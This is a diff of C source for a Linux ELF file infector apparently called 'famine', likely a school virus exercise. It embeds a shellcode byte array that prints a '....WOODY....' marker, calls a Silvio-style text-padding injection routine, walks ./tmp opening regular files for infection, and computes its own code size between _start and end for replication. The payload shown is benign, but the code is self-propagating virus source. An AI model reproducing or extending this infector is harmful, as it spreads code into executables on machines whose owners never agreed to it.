@@ -19,6 +19,9 @@
 char	g_payload[] = "\x52\xeb\x0f\x2e\x2e\x2e\x2e\x57\x4f\x4f\x44\x59\x2e\x2e\x2e\x2e\x0a\x00\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\xe0\xff\xff\xff\xba\x0f\x00\x00\x00\x0f\x05\x5a\xe9\xd0\xff\xff\xff";
 size_t	g_payload_size	= sizeof(g_payload) - 1;
 
+extern void _start();
+extern void end();
+
 // utils
 struct linux_dirent64 {
 	unsigned long d_ino;
@@ -77,7 +80,7 @@ char *text_section(t_data *data) {
 
 int	inject(t_data *data) {
 
-	char *text = text_section(data);
+	//char *text = text_section(data);
 
 	silvio(data, g_payload_size);
 
@@ -128,7 +131,8 @@ void	open_file(char *file)
 		{
 			dir = (struct linux_dirent64 *)(buf + i);
 
-			if (dir->d_name[0] == '.')
+			if (dir->d_name[0] == '.'
+					&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
 				continue;
 			
 			if (dir->d_type == DT_REG) {
@@ -148,9 +152,6 @@ void	open_file(char *file)
 
 void	famine(void)
 {
-	//test _sycall failure
-	unsigned long start;
-	__asm__ volatile ("lea (%%rip), %0 " : "=r" (start));
 
 	char p1[] = "./tmp";
 	char *paths[] = {
@@ -161,6 +162,10 @@ void	famine(void)
 	for (int i = 0; paths[i]; i++)
 		open_file(paths[i]);
 
-	unsigned long end;
-	__asm__ volatile ("lea (%%rip), %0 " : "=r" (end));
+	char tmp[] = "yolo";
+	_syscall(SYS_write, 1, tmp, ft_strlen(tmp));
+
+
+	unsigned long size =  (char *)&end - (char *)&_start;
+
 }
